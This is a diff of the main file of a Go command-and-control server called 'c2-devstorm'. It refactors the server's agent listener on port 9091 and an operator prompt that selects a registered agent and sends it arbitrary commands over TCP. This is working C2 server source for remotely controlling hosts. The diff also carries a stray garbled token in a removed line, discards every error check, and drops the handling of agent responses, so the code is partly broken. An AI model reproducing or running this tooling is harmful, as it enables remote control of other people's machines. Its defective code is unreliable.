@@ -1,6 +1,5 @@
 package main
 
-// Imports
 import (
 	"bufio"
 	"c2-devstorm/commons"
@@ -11,180 +10,128 @@ import (
 	"strings"
 )
 
-// Global variables
 var (
-	agentList     = []commons.Message{}
-	selectedAgent string
+	agents          = []commons.Message{}
+	selectedAgent   string
+	listenerPort    = "9091"
+	agentConnection net.Conn
 )
 
-// Main function
 func main() {
-	log.Println("Entrei em execução.")
-	go startListener("9091")
-
-	cliHandler()
+	log.Println("Started.")
+	go startListener(listenerPort)
+	handleCLI()
 }
 
-// Function to handle CLI
-func cliHandler() {
+func startListener(port string) {
+	listener, _ := net.Listen("tcp", "0.0.0.0:"+port)
+	defer listener.Close()
+
 	for {
+		connection, _ := listener.Accept()
+		go handleConnection(connection)
+	}
+}
 
-		if selectedAgent != "" {
-			print(selectedAgent + "[c2-devstorm]#")
-		} else {
-			print("[c2-devstorm]")
+func handleConnection(connection net.Conn) {
+	var message commons.Message
+	gob.NewDecoder(connection).Decode(&message)
+	agents = append(agents, message)
+	connection.Close()
+}
 
-		}
-		// reader := bufio.NewReader(os.Stdin)
-		reader := bufio.NewReader(os.Stdin)
-		completeCommand, _ := reader.ReadString('\n')
-		//println(completeCommand)
-		// completeCommand := "show agents"
-		separeteCommand := strings.Split(strings.TrimSuffix(completeCommand, "\n"), " ")
-		baseCommand := strings.TrimSpace(separeteCommand[0])
+func handleCLI() {
+	for {
+		displayPrompt()
+		input := readInput()
+		command := parseInput(input)
+		baseCommand := command[0]
 
 		if len(baseCommand) > 0 {
-			switch baseCommand {
-			case "show":
-				showhandler(separeteCommand)
-			case "select":
-				selectHandler(separeteCommand) fagemd
-			default:
-				if selectedAgent != "" {
-					command := &commons.Commands{Command: completeCommand}
-					command.Command = completeCommand
-
-					for index, message := range agentList {
-						if message.AgentID == selectedAgent {
-							agentList[index].Commands = append(agentList[index].Commands, *command)
-							channel, _ := net.Dial("tcp", message.AgentHostname+":"+message.AgentPort)
-							defer channel.Close()
-							gob.NewEncoder(channel).Encode(message)
-							gob.NewDecoder(channel).Decode(message)
-						}
-					}
-				} else {
-					log.Println("unknown command.")
-				}
-			}
-
+			executeCommand(baseCommand, command)
 		}
 	}
 }
-func showhandler(command []string) {
+
+func displayPrompt() {
+	if selectedAgent != "" {
+		print(selectedAgent + "[c2-devstorm]#")
+	} else {
+		print("[c2-devstorm]")
+	}
+}
+
+func readInput() string {
+	reader := bufio.NewReader(os.Stdin)
+	input, _ := reader.ReadString('\n')
+	return strings.TrimSuffix(input, "\n")
+}
+
+func parseInput(input string) []string {
+	return strings.Split(strings.TrimSpace(input), " ")
+}
+
+func executeCommand(baseCommand string, command []string) {
+	switch baseCommand {
+	case "show":
+		showCommand(command)
+	case "select":
+		selectCommand(command)
+	default:
+		executeSelectedAgentCommand(baseCommand, command)
+	}
+}
+
+func selectCommand(command []string) {
+	if len(command) > 1 {
+		selectedAgent = command[1]
+	} else {
+		log.Println("Unknown command.")
+	}
+
+}
+
+func executeSelectedAgentCommand(baseCommand string, command []string) {
+	if selectedAgent != "" {
+		completeCommand := strings.Join(command, " ")
+		c := &commons.Commands{Command: completeCommand}
+
+		updateAgentAndSendCommand(selectedAgent, c)
+	} else {
+		log.Println("Unknown command.")
+	}
+}
+
+func updateAgentAndSendCommand(agentID string, command *commons.Commands) {
+	for index, message := range agents {
+		if message.AgentID == agentID {
+			agents[index].Commands = append(agents[index].Commands, *command)
+			agentConnection = connectToAgent(message.AgentHostname + ":9092")
+
+			gob.NewEncoder(agentConnection).Encode(message)
+			gob.NewDecoder(agentConnection).Decode(message)
+		}
+	}
+}
+
+func connectToAgent(address string) net.Conn {
+	conn, _ := net.Dial("tcp", address)
+	return conn
+}
+
+func showCommand(command []string) {
 	if len(command) > 1 {
 		switch command[1] {
 		case "agents":
-			for _, agent := range agentList {
-				println("AgentID: " + agent.AgentID + " AgentHostname: " + agent.AgentHostname + "@" + " AgentCWD: " + "agent.AgentCWD")
-
-			}
-			agentLists(command[1])
+			displayAgentList()
 		default:
-			log.Println("unknown command.")
+			log.Println("Unknown command.")
 		}
-	} else {
-		log.Println("unknown command.")
-
-	}
-
-}
-
-// Function to handle select command
-func selectHandler(command []string) {
-	if len(command) > 1 {
-		selectedAgent = command[1]
-		if agentCreated(command[1]) {
-			selectedAgent = command[1]
-
-		} else {
-			log.Println("Agent not found.")
-			log.Println("To list agentList use: show agents.")
-
-		}
-	} else {
-		selectedAgent = " "
 	}
 }
 
-//func init() {
-//	agentList = make([]commons.Message, 0)
-//}
-
-// Function to check if agent is already registered
-func agentCreated(agentID string) (registered bool) {
-	registered = false
-	for _, agent := range agentList {
-		if agent.AgentID == agentID {
-			return true
-		}
-	}
-	return false
-}
-
-// Function to check if message contains response
-func messageContainsResponse(message *commons.Message) (contains bool) {
-	log.Println("Agent ID: ", message.AgentID+"\n")
-
-	contains = false
-	for _, command := range message.Commands {
-		if command.Response != "" || command.Response != " " || len(command.Response) > 0 {
-			return true
-		}
-	}
-	return false
-}
-
-// Function to list agents
-func agentLists(agentID string) (agentList []commons.Message) {
-	for _, agent := range agentList {
-		log.Println(agent)
-	}
-	return agentList
-}
-
-// Function to open socket
-func startListener(port string) {
-	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
-	if err != nil {
-		log.Fatal("Erro ao iniciar o Listener", err.Error())
-	} else {
-		for {
-			channel, err := listener.Accept()
-			defer channel.Close()
-
-			if err != nil {
-				log.Println("Erro em um novo canal:", err.Error())
-			} else {
-				message := &commons.Message{}
-				gob.NewDecoder(channel).Decode(message)
-				if agentCreated(message.AgentID) {
-
-					// TODO: Check if message contains response
-					if messageContainsResponse(message) {
-						log.Println("Mensagem contém resposta: ", message.AgentID+"\n")
-						for _, command := range message.Commands {
-							log.Println("Comando: ", command.Command+"\n")
-							log.Println("Resposta: ", command.Response+"\n")
-							//for _, agent := range agentList {
-							//	if agent.AgentID == message.AgentID {
-							//		agent.Commands = append(agent.Commands, command)
-							//	}
-							//
-							//}
-						}
-
-					}
-				} else {
-
-					log.Println("Nova Conexão: \n", channel.RemoteAddr().String())
-					log.Println("ID Agent: ", message.AgentID+"\n")
-					agentList = append(agentList, *message)
-				}
-
-				gob.NewEncoder(channel).Encode(message)
-
-			}
-		}
+func displayAgentList() {
+	for _, message := range agents {
+		log.Println(message.AgentID + " " + message.AgentHostname)
 	}
 }
